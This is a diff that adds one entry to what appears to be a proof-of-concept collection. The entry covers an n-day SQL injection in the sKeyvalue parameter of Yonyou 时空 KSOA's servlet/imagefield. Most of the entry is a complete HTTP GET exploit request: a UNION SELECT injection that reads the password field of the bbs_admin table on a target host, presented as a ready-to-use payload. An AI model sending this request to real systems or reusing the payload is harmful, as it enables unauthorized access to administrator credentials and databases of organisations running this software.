@@ -1,0 +1,7 @@
+vendor = "用友"
+name = "用友时空 KSOA servletimagefield 文件 sKeyvalue 参数 SQL 注入漏洞"
+type = "SQL注入"
+source = "TG"
+date = "08.14"
+poc = "GET http://target.com/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1 Host: target.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) 5bGx5rW35LmL5YWz Accept-Encoding: gzip, deflateConnection: close"
+label = "nday"
